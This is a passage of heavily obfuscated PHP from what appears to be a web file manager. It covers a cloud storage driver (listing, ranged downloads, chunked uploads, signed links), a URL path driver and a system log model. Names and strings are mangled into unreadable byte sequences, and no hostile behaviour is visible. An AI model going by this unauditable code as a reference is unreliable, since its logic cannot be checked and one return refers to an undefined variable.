? $—¬¨èß³[8] : $—¬¨èß³[12]); $“ğÙñ—ò = array($—¬¨èß³[32] => $µ…­†ª, $—¬¨èß³[33] => $Ç½Ñå · ? $—¬¨èß³[77] : $—¬¨èß³[216], $—¬¨èß³[78] => $àØéåÓ¦[$—¬¨èß³[383]], $—¬¨èß³[1488] => $àØéåÓ¦[$—¬¨èß³[1494]]); $this->cacheMethodInfoSet($µ…­†ª, $Ç½Ñå ·, $“ğÙñ—ò); if ($Ç½Ñå ·) { $ÙÑèû¦„[] = $µ…­†ª; if ($ƒ¥úîÊ×) { $this->fileList($µ…­†ª, $ÙÑèû¦„, $‘”Àìıã, $ƒ¥úîÊ×); } continue; } $‘”Àìıã[] = $“ğÙñ—ò; } if (count($â®¸½‘) < $ºîêäÒ°) { break; } } $this->cacheMethodInfoSet($¯´ğ™Ï, !0); } public function listPath($ÉÃÂ³ùÛ, $“üœ²ç = false) { $€¡™¥› =& $_SERVER[ ÇƒŠìÀ]; $•¥Óº¸ = $öùñ—›£ = array(); $this->fileList($ÉÃÂ³ùÛ, $•¥Óº¸, $öùñ—›£); foreach ($•¥Óº¸ as $‰ı„îà => $øĞİ»Â) { $•¥Óº¸[$‰ı„îà] = $this->folderInfo($øĞİ»Â, $“üœ²ç); } foreach ($öùñ—›£ as $‰ı„îà => $øĞİ»Â) { $öùñ—›£[$‰ı„îà] = $this->fileInfo($øĞİ»Â[$€¡™¥›[32]], $“üœ²ç, $øĞİ»Â); } return array($€¡™¥›[84] => $•¥Óº¸, $€¡™¥›[85] => $öùñ—›£); } public function has($Û£¾ï•Å, $‚êœ…‹‚ = false, $íçÆ±ÖÎ = true) { $ÂÑçóîÔ =& $_SERVER[ ÇƒŠìÀ]; $â¿Ğ˜§§ = $ÂÑçóîÔ[12]; $–Úƒéöê = 500; $’óÕÏĞˆ = 0; $Ç²™öóô = 0; $ªÁµªæè = rtrim($Û£¾ï•Å, $ÂÑçóîÔ[8]) . $ÂÑçóîÔ[8]; while (!0) { check_abort(); $Û€Šæ­Û = $this->listObjs($Û£¾ï•Å, $â¿Ğ˜§§, $–Úƒéöê); if (!$Û€Šæ­Û) { return !1; } $â¿Ğ˜§§ = isset($Û€Šæ­Û[$ÂÑçóîÔ[1492]]) ? $Û€Šæ­Û[$ÂÑçóîÔ[1492]] : $ÂÑçóîÔ[12]; $°‹•“”† = isset($Û€Šæ­Û[$ÂÑçóîÔ[1493]]) ? $Û€Šæ­Û[$ÂÑçóîÔ[1493]] : array(); if (empty($°‹•“”†)) { break; } $ğáº¸¿© = array_filter($°‹•“”†, function ($—š®—¬Æ) { $ñïí¯£ =& $_SERVER[ ÇƒŠìÀ]; return $—š®—¬Æ[$ñïí¯£[33]] == $ñïí¯£[77]; }); $’Ç¸Ü¿ù = count($°‹•“”†); $ğáº¸¿© = count($ğáº¸¿©); $”¼³•¦Õ = $’Ç¸Ü¿ù - $ğáº¸¿©; if ($‚êœ…‹‚) { $Ç²™öóô += $ğáº¸¿©; $’óÕÏĞˆ += $”¼³•¦Õ; if ($’Ç¸Ü¿ù < $–Úƒéöê) { break; } continue; } if ($íçÆ±ÖÎ) { if ($”¼³•¦Õ) { return !0; } } else { if ($ğáº¸¿©) { return !0; } } if ($’Ç¸Ü¿ù < $–Úƒéöê) { break; } } if ($‚êœ…‹‚) { return array($ÂÑçóîÔ[225] => $’óÕÏĞˆ, $ÂÑçóîÔ[226] => $Ç²™öóô); } return !1; } public function listAll($€œ×ÏªÂ) { $‹Ï´Ñâ =& $_SERVER[ ÇƒŠìÀ]; $îïî“íï = $ë¬ƒ¹öŠ = array(); $this->fileList($€œ×ÏªÂ, $îïî“íï, $ë¬ƒ¹öŠ, !0); $Š…˜üÚè = array_to_keyvalue($ë¬ƒ¹öŠ, $‹Ï´Ñâ[32]); foreach ($îïî“íï as $€Œ÷¶ıÏ) { if (is_string($€Œ÷¶ıÏ)) { $Š…˜üÚè[$€Œ÷¶ıÏ] = array($‹Ï´Ñâ[78] => 0); } } return $this->listAllFiles($€œ×ÏªÂ, $Š…˜üÚè); } public function canRead($ÓØ–©©) { return $this->exist($ÓØ–©©) ? !0 : !1; } public function canWrite($İò³¢é¼) { return $this->exist($İò³¢é¼) ? !0 : !1; } public function getContent($µÚÅû÷¬) { return $this->fileSubstr($µÚÅû÷¬, 0, -1); } public function setContent($™æÜ„Ìñ, $ƒö£ãÕí = '') { $€•ûÕí… =& $_SERVER[ ÇƒŠìÀ]; if (!$ƒö£ãÕí) { $àÜ¶³Ë = $this->ussRequest($™æÜ„Ìñ, $€•ûÕí…[243]); return $àÜ¶³Ë[$€•ûÕí…[1247]]; } $Ñ²ù¡  = $this->tempFile($this->pathThis($™æÜ„Ìñ)); file_put_contents($Ñ²ù¡ , $ƒö£ãÕí); if ($this->upload($™æÜ„Ìñ, $Ñ²ù¡ )) { $this->tempFileRemve($Ñ²ù¡ ); return !0; } return !1; } public function fileSubstr($Û°›šªÏ, $¿ıòø©Ş, $Í£Š´¨Ş) { $£ó§¨ù =& $_SERVER[ ÇƒŠìÀ]; if (!($Ëò‚¼ğ = $this->link($Û°›šªÏ))) { return !1; } $óÌÎŞ­» = !1; if ($Í£Š´¨Ş > 0) { $ø€ìâ´Í = $¿ıòø©Ş + $Í£Š´¨Ş - 1; $óÌÎŞ­» = array($£ó§¨ù[1455] . $¿ıòø©Ş . $£ó§¨ù[432] . $ø€ìâ´Í); } $ÙÂƒ±Œø = url_request($Ëò‚¼ğ, $£ó§¨ù[247], !1, $óÌÎŞ­»); return $ÙÂƒ±Œø[$£ó§¨ù[779]] ? $ÙÂƒ±Œø[$£ó§¨ù[1237]] : !1; } public function upload($©¾ññ¦Ì, $‡Êµâñã, $¸ú¼šğÈ = false, $¯ŒÒí£ü = REPEAT_REPLACE) { $Ì®Íê¦× =& $_SERVER[ ÇƒŠìÀ]; $†˜´áÀ = IO::size($‡Êµâñã); if ($†˜´áÀ <= 1024 * 1024 * 200) { $ú•ÄòÎÜ = array($Ì®Íê¦×[1495] . $‡Êµâñã); $ıƒıûÆç = $this->ussRequest($©¾ññ¦Ì, $Ì®Íê¦×[245], $ú•ÄòÎÜ); return $ıƒıûÆç[$Ì®Íê¦×[1247]] ? $this->getPathOuter($©¾ññ¦Ì) : !1; } $Ê”ìØÂ = 1024 * 1024 * 10; $ïˆ¼Æë = array($Ì®Íê¦×[1496], $Ì®Íê¦×[1497] . $†˜´áÀ, $Ì®Íê¦×[1498], $Ì®Íê¦×[1499] . $Ê”ìØÂ); $ıƒıûÆç = $this->ussRequest($©¾ññ¦Ì, $Ì®Íê¦×[245], !1, $ïˆ¼Æë); if (!$ıƒıûÆç[$Ì®Íê¦×[1247]]) { return !1; } $Ê¢ß„à² = $ıƒıûÆç[$Ì®Íê¦×[1237]]; $€™¦·şÃ = 0; $œŠ³õà = $Ê¢ß„à²[$Ì®Íê¦×[1500]]; $¦ã©ÁÈ = fopen($‡Êµâñã, $Ì®Íê¦×[1402]); if (!$¦ã©ÁÈ) { return !1; } do { $ãß¨¬¯Å = $Ê¢ß„à²[$Ì®Íê¦×[1501]]; fseek_64($¦ã©ÁÈ, $€™¦·şÃ); $ª÷¡é¥Ó = fread($¦ã©ÁÈ, $ãß¨¬¯Å); $ïêÛÛÅì = 0; do { $ïêÛÛÅì++; $Ê¢ß„à² = $this->uploadPart($©¾ññ¦Ì, $Ê¢ß„à², $ª÷¡é¥Ó); } while (!$Ê¢ß„à² && $ïêÛÛÅì < 3); if (!$Ê¢ß„à²) { return !1; } $œŠ³õà = $Ê¢ß„à²[$Ì®Íê¦×[1500]]; $€™¦·şÃ += $ãß¨¬¯Å; } while ($œŠ³õà != -1); fclose($¦ã©ÁÈ); $ïˆ¼Æë = array($Ì®Íê¦×[1502], $Ì®Íê¦×[1503] . $Ê¢ß„à²[$Ì®Íê¦×[1504]], $Ì®Íê¦×[1498]); $ıƒıûÆç = $this->ussRequest($©¾ññ¦Ì, $Ì®Íê¦×[245], !1, $ïˆ¼Æë); return $ıƒıûÆç[$Ì®Íê¦×[1247]] ? $this->getPathOuter($˜‡ßºÄ) : !1; } private function uploadPart($Ëˆ›Ñ°, $Å´…®È·, &$ôÚÏ¼ğ¶) { $õÂ§óÛò =& $_SERVER[ ÇƒŠìÀ]; $¸Üë‹Ø« = array($õÂ§óÛò[1505], $õÂ§óÛò[1503] . $Å´…®È·[$õÂ§óÛò[1504]], $õÂ§óÛò[1506] . $Å´…®È·[$õÂ§óÛò[1500]], $õÂ§óÛò[145] . $Å´…®È·[$õÂ§óÛò[1501]]); $ö»©Õìò = $this->ussRequest($Ëˆ›Ñ°, $õÂ§óÛò[245], $ôÚÏ¼ğ¶, $¸Üë‹Ø«); return !$ö»©Õìò[$õÂ§óÛò[1247]] ? $ö»©Õìò[$õÂ§óÛò[1247]] : $ö»©Õìò[$õÂ§óÛò[1237]]; } public function uploadFormData($Ï•…ùó—, $ÁÌ¥ò™è = 3600) { return $this->uploadPolicy($Ï•…ùó—, $ÁÌ¥ò™è); } public function multiUploadFormData($Šöˆ¿Õ, $ÑıÃ¿Üì = 3600) { $šƒ˜¡Äƒ =& $_SERVER[ ÇƒŠìÀ]; $ëÔ‡•ŠŸ = (int) $GLOBALS[$šƒ˜¡Äƒ[7]][$šƒ˜¡Äƒ[78]]; return $this->uploadPolicy($Šöˆ¿Õ, $ÑıÃ¿Üì, $ëÔ‡•ŠŸ); } private function uploadPolicy($¾Ãí„ûá, $–ŞƒâÆ¿ = 3600, $ñŞÀáÉ¸ = 0) { $âºãÓ£ò =& $_SERVER[ ÇƒŠìÀ]; $Áñâ¨ † = $âºãÓ£ò[8] . $this->bucket; $â°éÏÅæ = gmdate($âºãÓ£ò[1441]); $üºÜÁØ = array($âºãÓ£ò[1507] => $this->bucket, $âºãÓ£ò[1508] => $¾Ãí„ûá, $âºãÓ£ò[1509] => time() + $–ŞƒâÆ¿, $âºãÓ£ò[1510] => $â°éÏÅæ); if ($ñŞÀáÉ¸) { $üºÜÁØ[$âºãÓ£ò[1422]] = $ñŞÀáÉ¸; } $‹·Ó¿†§ = base64_encode(json_encode($üºÜÁØ)); $Âù¾¼ÇŸ = base64_encode(hash_hmac($âºãÓ£ò[1477], "\120\117\x53\124\46{$Áñâ¨ †}\46{$â°éÏÅæ}\46{$‹·Ó¿†§}", md5("{$this->userpass}"), !0)); $†˜ÎƒÙŸ = array($âºãÓ£ò[278] => $‹·Ó¿†§, $âºãÓ£ò[1511] => "\x55\120\x59\125\x4e\40{$this->username}\x3a{$Âù¾¼ÇŸ}", $âºãÓ£ò[198] => $this->endpoint . $Áñâ¨ †); return $†˜ÎƒÙŸ; } public function download($Şô’õææ, $Úç•»ÆÀ) { $µà­ñ¬ß = IO::getPathInner(IO::mkfile($Úç•»ÆÀ)); if (!($¨×„¬‹ï = $this->link($Şô’õææ))) { return !1; } $°“¢Ëİ = 0; $È¾ÃªŸ = 1024 * 200; $°ßëÉ™À = fopen($µà­ñ¬ß, $_SERVER[ ÇƒŠìÀ][1461]); while (!0) { $ØåÈ‹Á˜ = $this->fileSubstr($Şô’õææ, $°“¢Ëİ, $È¾ÃªŸ); if ($ØåÈ‹Á˜ === !1) { return !1; } fwrite($°ßëÉ™À, $ØåÈ‹Á˜); $°“¢Ëİ += $È¾ÃªŸ; if (strlen($ØåÈ‹Á˜) < $È¾ÃªŸ) { break; } } fclose($°ßëÉ™À); return $Úç•»ÆÀ; } public function link($ù¤öÆÇß, $Ã­ª¤ëê = array()) { $ÚËí…ıĞ =& $_SERVER[ ÇƒŠìÀ]; $ù¤öÆÇß = trim($ù¤öÆÇß, $ÚËí…ıĞ[8]); if (!empty($this->token)) { $–…½Õ©· = strtotime(date($ÚËí…ıĞ[1512])); $§¶éû€§ = substr(md5($this->token . $ÚËí…ıĞ[330] . $–…½Õ©· . $ÚËí…ıĞ[1513] . $ù¤öÆÇß), 12, 8) . $–…½Õ©·; $Ã­ª¤ëê[] = $ÚËí…ıĞ[1514] . $§¶éû€§; } $ÖÅÙ’ı = !empty($Ã­ª¤ëê) ? $ÚËí…ıĞ[75] . implode($ÚËí…ıĞ[330], $Ã­ª¤ëê) : $ÚËí…ıĞ[12]; return $this->getHost() . $ÚËí…ıĞ[8] . $ù¤öÆÇß . $ÖÅÙ’ı; } public function fileOut($ĞÃ¨Ñ£¡, $Õ²•‰úË = false, $¯…·ÀÑ¸ = false, $»³Â˜‡ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ĞÃ¨Ñ£¡, $Õ²•‰úË, $¯…·ÀÑ¸, $»³Â˜‡); } if (!$¯…·ÀÑ¸) { $¯…·ÀÑ¸ = $this->pathThis($ĞÃ¨Ñ£¡); } $âìø«à‘ = $Õ²•‰úË ? array($_SERVER[ ÇƒŠìÀ][1515] . rawurlencode($¯…·ÀÑ¸)) : array(); $¾Ò¼‡¿¾ = $this->link($ĞÃ¨Ñ£¡, $âìø«à‘); $this->fileOutLink($¾Ò¼‡¿¾); } public function fileOutServer($À“İ×¥», $àâŞøÄÇ = false, $Ü–û¤ˆï = false, $ù×ùÔ  = '') { parent::fileOut($À“İ×¥», $àâŞøÄÇ, $Ü–û¤ˆï, $ù×ùÔ ); } public function fileOutImage($„ê‚…æç, $á®ë”à = 250) { $‚ıõ‹ı = $this->link($„ê‚…æç . $_SERVER[ ÇƒŠìÀ][1516] . $á®ë”à); $this->fileOutLink($‚ıõ‹ı); } public function fileOutImageServer($„ÕúòÚ, $ƒÕûŠìå = 250) { parent::fileOutImage($„ÕúòÚ, $ƒÕûŠìå); } public function hashMd5($Ñ—ŠÒÜÚ) { $§ ö ‰‰ =& $_SERVER[ ÇƒŠìÀ]; $˜Ê–„› = $this->_objectMeta($Ñ—ŠÒÜÚ); return isset($˜Ê–„›[$§ ö ‰‰[230]]) ? $˜Ê–„›[$§ ö ‰‰[230]] : !1; } public function size($—–Ï¹–Ç) { $Ìáä’¹ = $this->objectMeta($—–Ï¹–Ç); return $Ìáä’¹ ? $Ìáä’¹[$_SERVER[ ÇƒŠìÀ][78]] : 0; } public function info($áš®ƒ³Ô) { if ($this->isFolder($áš®ƒ³Ô)) { return $this->folderInfo($áš®ƒ³Ô); } else { if ($this->isFile($áš®ƒ³Ô)) { return $this->fileInfo($áš®ƒ³Ô); } } return !1; } public function exist($‰›‰Î) { return $this->isFile($‰›‰Î) || $this->isFolder($‰›‰Î); } public function isFile($Şô©õË¯) { return !$this->isFolder($Şô©õË¯) && $this->objectMeta($Şô©õË¯); } public function isFolder($™æ×ı›ä) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][168], $™æ×ı›ä); } protected function objectMeta($èÜ®èÙÄ) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][170], $èÜ®èÙÄ); } protected function _objectMeta($¨æ®šÔ¤) { $µ™íã =& $_SERVER[ ÇƒŠìÀ]; if ($¨æ®šÔ¤ == $µ™íã[12] || $¨æ®šÔ¤ == $µ™íã[8]) { return array(); } $Ä†³û®¡ = $this->ussRequest($¨æ®šÔ¤, $µ™íã[1517]); if (!$Ä†³û®¡[$µ™íã[1247]]) { return null; } $Ç´ıÛ–¾ = isset($Ä†³û®¡[$µ™íã[1237]]) ? $Ä†³û®¡[$µ™íã[1237]] : array(); if (!isset($Ç´ıÛ–¾[$µ™íã[1518]])) { return null; } $Â¡ÔóÔ = array($µ™íã[33] => isset($Ç´ıÛ–¾[$µ™íã[1518]]) ? $Ç´ıÛ–¾[$µ™íã[1518]] : null, $µ™íã[78] => isset($Ç´ıÛ–¾[$µ™íã[1519]]) ? $Ç´ıÛ–¾[$µ™íã[1519]] : null, $µ™íã[230] => isset($Ç´ıÛ–¾[$µ™íã[1520]]) ? $Ç´ıÛ–¾[$µ™íã[1520]] : null, $µ™íã[1487] => isset($Ç´ıÛ–¾[$µ™íã[1521]]) ? $Ç´ıÛ–¾[$µ™íã[1521]] : null); $Â¡ÔóÔ[$µ™íã[1488]] = isset($Ç´ıÛ–¾[$µ™íã[1522]]) ? strtotime($Ç´ıÛ–¾[$µ™íã[1522]]) : $Â¡ÔóÔ[$µ™íã[1487]]; return $Â¡ÔóÔ; } protected function _isFolder($“º­Èüó) { $ŠÖ£–£ =& $_SERVER[ ÇƒŠìÀ]; if ($“º­Èüó == $ŠÖ£–£[12] || $“º­Èüó == $ŠÖ£–£[8]) { return !0; } $Š‘§àÛ¡ = $this->_objectMeta($“º­Èüó); return isset($Š‘§àÛ¡[$ŠÖ£–£[33]]) && $Š‘§àÛ¡[$ŠÖ£–£[33]] == $ŠÖ£–£[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¹±’ğÍû = false) { } public function exist($¥ŠÒÜ†Â) { $Ëº¯åô = $this->info($¥ŠÒÜ†Â); return $Ëº¯åô[$_SERVER[ ÇƒŠìÀ][218]]; } public function isFile($†ğ©Œ¬û) { $ã•åÇ‘… = $this->info($†ğ©Œ¬û); return $ã•åÇ‘…[$_SERVER[ ÇƒŠìÀ][218]]; } public function isFolder($üö‘šï³) { return !1; } public function size($±ÄãÀû«) { $ºìñ°Üå = $this->info($±ÄãÀû«); return $ºìñ°Üå[$_SERVER[ ÇƒŠìÀ][78]]; } public function info($µ†åœ©) { return $this->infoParse($µ†åœ©); } public function infoAuth($Ô‘×ÍÌ) { return $this->infoParse($Ô‘×ÍÌ); } public function infoWithChildren($ã¢ìâ¦š) { return $this->infoParse($ã¢ìâ¦š); } public function infoFull($îÂâğ³¢) { return $this->infoParse($îÂâğ³¢); } private function infoParse($¯ˆ°ò«) { $™ê¬¢ß =& $_SERVER[ ÇƒŠìÀ]; $•å”¶™ = $this->header($¯ˆ°ò«); if (!$•å”¶™ || !$•å”¶™[$™ê¬¢ß[779]]) { return !1; } $£Äß§è¿ = _get($•å”¶™, $™ê¬¢ß[383], 0); $Ó°œ¤®µ = array($™ê¬¢ß[32] => $•å”¶™[$™ê¬¢ß[32]], $™ê¬¢ß[86] => $¯ˆ°ò«, $™ê¬¢ß[33] => $™ê¬¢ß[216], $™ê¬¢ß[78] => intval($£Äß§è¿), $™ê¬¢ß[177] => get_path_ext($•å”¶™[$™ê¬¢ß[32]]), $™ê¬¢ß[1399] => $£Äß§è¿ > 0 && $•å”¶™[$™ê¬¢ß[1523]], $™ê¬¢ß[1400] => !1); return $Ó°œ¤®µ; } private function header($ä»¬‚¾) { $–Êç¨Ï© =& $_SERVER[ ÇƒŠìÀ]; if (isset(self::$_cacheHeader[$ä»¬‚¾])) { return self::$_cacheHeader[$ä»¬‚¾]; } $ÙŞ¤©Ïå = isset($GLOBALS[$–Êç¨Ï©[1524]]) ? $GLOBALS[$–Êç¨Ï©[1524]] : !1; $GLOBALS[$–Êç¨Ï©[1524]] = !0; self::$_cacheHeader[$ä»¬‚¾] = url_header($ä»¬‚¾); $GLOBALS[$–Êç¨Ï©[1524]] = $ÙŞ¤©Ïå; return self::$_cacheHeader[$ä»¬‚¾]; } public function hashSimple($ßí›ı¹±, $éÛÅ¸ğÚ = false) { $§™ôÁ®ˆ =& $_SERVER[ ÇƒŠìÀ]; $åÌ‰³á = $this->info($ßí›ı¹±); if (!$åÌ‰³á || !$åÌ‰³á[$§™ôÁ®ˆ[218]]) { return !1; } $µ¯ÃÎ‹å = $åÌ‰³á[$§™ôÁ®ˆ[78]]; $Òæ»Óœ = 200; $ìû™ÁÛß = 50; if ($µ¯ÃÎ‹å <= $Òæ»Óœ * $ìû™ÁÛß) { return md5($this->fileSubstr($ßí›ı¹±, 0, $µ¯ÃÎ‹å)) . $µ¯ÃÎ‹å; } $ÁÒÃŞ¼ò = intval($µ¯ÃÎ‹å / $ìû™ÁÛß); $šƒÎ´ = $§™ôÁ®ˆ[12]; $¸ÑãØÁ = timeFloat(); $«·´Éêú = 15; for ($ìÂá£Ô = 0; $ìÂá£Ô < $ìû™ÁÛß; $ìÂá£Ô++) { if (timeFloat() - $¸ÑãØÁ > $«·´Éêú) { return !1; } $²¥—ÁÏ– = $this->fileSubstr($ßí›ı¹±, $ÁÒÃŞ¼ò * $ìÂá£Ô, $Òæ»Óœ); if (!$²¥—ÁÏ–) { return !1; } $šƒÎ´ .= $²¥—ÁÏ–; } $šƒÎ´ .= $this->fileSubstr($ßí›ı¹±, $µ¯ÃÎ‹å - $Òæ»Óœ, $Òæ»Óœ); return md5($šƒÎ´) . $µ¯ÃÎ‹å; } public function getContent($±“™†øÛ) { return $this->fileSubstr($±“™†øÛ); } public function fileSubstr($Ëö‘ı, $ô–šª¸ª = 0, $Æ³¼æÂ® = -1) { $ˆêºµª¬ =& $_SERVER[ ÇƒŠìÀ]; $Ü×Ê›°Â = $this->info($Ëö‘ı); if (!$Ü×Ê›°Â || !$Ü×Ê›°Â[$ˆêºµª¬[218]] && $Ü×Ê›°Â[$ˆêºµª¬[78]] > 1024 * 1024 * 10) { return !1; } if ($Æ³¼æÂ® === -1) { $Æ³¼æÂ® = $Ü×Ê›°Â[$ˆêºµª¬[78]]; } if ($Æ³¼æÂ® == 0) { return $ˆêºµª¬[12]; } $Úã—´½× = array($ˆêºµª¬[1525] . $ô–šª¸ª . $ˆêºµª¬[811] . ($ô–šª¸ª + $Æ³¼æÂ® - 1)); $×åã™˜À = url_request($Ëö‘ı, $ˆêºµª¬[247], !1, $Úã—´½×, !1, !1, 30); return $×åã™˜À[$ˆêºµª¬[1237]] ? $×åã™˜À[$ˆêºµª¬[1237]] : $ˆêºµª¬[12]; } public function download($ÊÃŞËˆ¬, $µî“Ø) { Downloader::start($ÊÃŞËˆ¬, $µî“Ø); return $µî“Ø; } } $_file = $_SERVER[$_SERVER[ ÇƒŠìÀ][907]]; goto f¦¨ëÏ; bæĞ©ôöÇï: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\151\155\145", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $òæÑæÏ¶ =& $_SERVER[ ÇƒŠìÀ]; return array($òæÑæÏ¶[2226] => LNG($òæÑæÏ¶[2227]), $òæÑæÏ¶[2228] => LNG($òæÑæÏ¶[2229]), $òæÑæÏ¶[1830] => LNG($òæÑæÏ¶[2230]), $òæÑæÏ¶[2231] => LNG($òæÑæÏ¶[2232]), $òæÑæÏ¶[2233] => LNG($òæÑæÏ¶[2234]), $òæÑæÏ¶[2235] => LNG($òæÑæÏ¶[2236]), $òæÑæÏ¶[2237] => LNG($òæÑæÏ¶[2238]), $òæÑæÏ¶[1860] => LNG($òæÑæÏ¶[2238]), $òæÑæÏ¶[1861] => LNG($òæÑæÏ¶[2239]), $òæÑæÏ¶[2240] => LNG($òæÑæÏ¶[2241]), $òæÑæÏ¶[2242] => LNG($òæÑæÏ¶[2243]), $òæÑæÏ¶[2244] => LNG($òæÑæÏ¶[2245]), $òæÑæÏ¶[2246] => LNG($òæÑæÏ¶[2247]), $òæÑæÏ¶[1858] => LNG($òæÑæÏ¶[2248]), $òæÑæÏ¶[2249] => LNG($òæÑæÏ¶[2250]), $òæÑæÏ¶[1865] => LNG($òæÑæÏ¶[2251]), $òæÑæÏ¶[2252] => LNG($òæÑæÏ¶[2253]), $òæÑæÏ¶[2254] => LNG($òæÑæÏ¶[2255]), $òæÑæÏ¶[2256] => LNG($òæÑæÏ¶[2257]), $òæÑæÏ¶[2258] => LNG($òæÑæÏ¶[2259]), $òæÑæÏ¶[1868] => LNG($òæÑæÏ¶[2260]), $òæÑæÏ¶[1869] => LNG($òæÑæÏ¶[2261]), $òæÑæÏ¶[2262] => LNG($òæÑæÏ¶[2263]), $òæÑæÏ¶[2264] => LNG($òæÑæÏ¶[2265]), $òæÑæÏ¶[2266] => LNG($òæÑæÏ¶[2267]), $òæÑæÏ¶[1863] => LNG($òæÑæÏ¶[2268]), $òæÑæÏ¶[2269] => LNG($òæÑæÏ¶[2270]), $òæÑæÏ¶[1862] => LNG($òæÑæÏ¶[2271]), $òæÑæÏ¶[2272] => LNG($òæÑæÏ¶[2273]), $òæÑæÏ¶[2274] => LNG($òæÑæÏ¶[2275]), $òæÑæÏ¶[2276] => LNG($òæÑæÏ¶[2277]), $òæÑæÏ¶[2278] => LNG($òæÑæÏ¶[2278]), $òæÑæÏ¶[2279] => LNG($òæÑæÏ¶[1834]), $òæÑæÏ¶[2280] => LNG($òæÑæÏ¶[2281]), $òæÑæÏ¶[2282] => LNG($òæÑæÏ¶[2283]), $òæÑæÏ¶[2284] => LNG($òæÑæÏ¶[2285]), $òæÑæÏ¶[2286] => LNG($òæÑæÏ¶[2287]), $òæÑæÏ¶[2288] => LNG($òæÑæÏ¶[2289]), $òæÑæÏ¶[2290] => LNG($òæÑæÏ¶[2290]), $òæÑæÏ¶[2291] => LNG($òæÑæÏ¶[2292]), $òæÑæÏ¶[2293] => LNG($òæÑæÏ¶[2294]), $òæÑæÏ¶[2295] => LNG($òæÑæÏ¶[2296]), $òæÑæÏ¶[2297] => LNG($òæÑæÏ¶[2298]), $òæÑæÏ¶[2299] => LNG($òæÑæÏ¶[2300]), $òæÑæÏ¶[2301] => LNG($òæÑæÏ¶[2302])); } private function typeFile() { $èÑúÀÉŒ =& $_SERVER[ ÇƒŠìÀ]; $ôØİÌ = array($èÑúÀÉŒ[1865] => array($èÑúÀÉŒ[1866]), $èÑúÀÉŒ[2244] => array($èÑúÀÉŒ[2303]), $èÑúÀÉŒ[2246] => array($èÑúÀÉŒ[2304]), $èÑúÀÉŒ[1858] => array($èÑúÀÉŒ[1859], $èÑúÀÉŒ[2305]), $èÑúÀÉŒ[2254] => array(), $èÑúÀÉŒ[2256] => array(), $èÑúÀÉŒ[2258] => array(), $èÑúÀÉŒ[1868] => array($èÑúÀÉŒ[1870]), $èÑúÀÉŒ[1869] => array($èÑúÀÉŒ[1870]), $èÑúÀÉŒ[2262] => array($èÑúÀÉŒ[2306]), $èÑúÀÉŒ[2264] => array($èÑúÀÉŒ[2306]), $èÑúÀÉŒ[2266] => array($èÑúÀÉŒ[2307]), $èÑúÀÉŒ[2252] => array($èÑúÀÉŒ[2308]), $èÑúÀÉŒ[1863] => array($èÑúÀÉŒ[2309]), $èÑúÀÉŒ[2269] => array($èÑúÀÉŒ[2310]), $èÑúÀÉŒ[1862] => array($èÑúÀÉŒ[1864])); return $ôØİÌ; } private function typeAll() { $Å‚…ÙĞ¸ =& $_SERVER[ ÇƒŠìÀ]; $ÖòÅÛÑö = $this->typeList; $äÛñé†Ì = array_filter($this->typeFile()); foreach ($äÛñé†Ì as $ÇûÅºÌÇ => $ò‹ÔøªÜ) { $ÖòÅÛÑö[$ò‹ÔøªÜ[0]] = $ÖòÅÛÑö[$ÇûÅºÌÇ]; } $ÖòÅÛÑö[$Å‚…ÙĞ¸[1870]] = LNG($Å‚…ÙĞ¸[2311]); $ÖòÅÛÑö[$Å‚…ÙĞ¸[2306]] = LNG($Å‚…ÙĞ¸[2312]); return $ÖòÅÛÑö; } public function addLog($ÉÖ’³¶º, $­€äñ‘ = array()) { $íÅÉŠé® =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->typeList[$ÉÖ’³¶º])) { return; } $¥­èŠ³á = isset($­€äñ‘[$íÅÉŠé®[1689]]) ? $­€äñ‘[$íÅÉŠé®[1689]] : 0; if (!$¥­èŠ³á) { $¥­èŠ³á = Session::get($íÅÉŠé®[2024]); } if ($ÉÖ’³¶º == $íÅÉŠé®[2280] && is_array($­€äñ‘[$íÅÉŠé®[2313]]) && !$­€äñ‘[$íÅÉŠé®[2313]]) { return; } $ğŠ©å› = get_client_ip(); if (!$­€äñ‘ || strlen(json_encode($­€äñ‘)) >= 1024) { $­€äñ‘ = array($íÅÉŠé®[2314] => $ğŠ©å›); } else { if (is_array($­€äñ‘)) { $­€äñ‘[$íÅÉŠé®[2314]] = $ğŠ©å›; } else { $­€äñ‘ = array($íÅÉŠé®[1237] => $­€äñ‘, $íÅÉŠé®[2314] => $ğŠ©å›); } } $­€äñ‘ = array($íÅÉŠé®[1679] => Session::sign(), $íÅÉŠé®[1680] => intval($¥­èŠ³á), $íÅÉŠé®[33] => $ÉÖ’³¶º, $íÅÉŠé®[1682] => json_encode($­€äñ‘)); parent::add($­€äñ‘); } public function remove($ûˆ—Åé¥) { $this->where(array($_SERVER[ ÇƒŠìÀ][463] => $ûˆ—Åé¥))->delete(); } private function _makeOrder($‹…îĞØæ = '') { $îÚÇ‚óğ =& $_SERVER[ ÇƒŠìÀ]; $™¡ «æÌ = $îÚÇ‚óğ[217]; $òşÜ•óí = array($îÚÇ‚óğ[493] => $îÚÇ‚óğ[494], $îÚÇ‚óğ[495] => $îÚÇ‚óğ[496]); $³ÀÉ‚ä¸ = Input::get($îÚÇ‚óğ[501], $îÚÇ‚óğ[7], $îÚÇ‚óğ[2060], array($îÚÇ‚óğ[1978], $îÚÇ‚óğ[495])); $³ÀÉ‚ä¸ = $òşÜ•óí[$³ÀÉ‚ä¸]; $‹…îĞØæ = $‹…îĞØæ . "{$™¡ «æÌ}\40{$³ÀÉ‚ä¸}"; return $this->order($‹…îĞØæ); } public function get($ûŠ‹»Ê = '') { $ÄôÈäØ =& $_SERVER[ ÇƒŠìÀ]; if (!$ûŠ‹»Ê) { show_json(array()); } $¿¶°£şÏ = array(); if ($ûŠ‹»Ê[$ÄôÈäØ[1689]]) { $¿¶°£şÏ[$ÄôÈäØ[1689]] = $ûŠ‹»Ê[$ÄôÈäØ[1689]]; } if (isset($ûŠ‹»Ê[$ÄôÈäØ[789]])) { $É„îíĞ = 